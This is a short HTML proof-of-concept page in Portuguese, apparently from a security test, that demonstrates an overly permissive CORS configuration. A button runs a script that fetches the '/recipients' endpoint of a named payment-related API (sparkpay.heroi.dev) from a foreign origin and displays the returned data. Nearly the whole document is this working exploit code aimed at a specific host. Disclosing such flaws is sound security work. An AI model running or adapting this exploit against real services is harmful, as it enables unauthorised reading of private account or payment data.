<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <title>CORS PoC – Leitura Cross-Origin</title>
  </head>
  <body>
    <h2>PoC 1 – CORS Excessivamente Permissivo</h2>

    <button onclick="exploit()">Executar PoC</button>

    <pre id="result" style="white-space: pre-wrap; margin-top: 20px;"></pre>

    <script>
      function exploit() {
        fetch("https://sparkpay.heroi.dev/recipients", {
          method: "GET"
        })
        .then(response => response.text())
        .then(data => {
          document.getElementById("result").innerText =
            "Resposta da API lida a partir de um domínio externo:\n\n" + data;
        })
        .catch(error => {
          document.getElementById("result").innerText =
            "Erro ao executar a PoC:\n" + error;
        });
      }
    </script>
  </body>
</html>
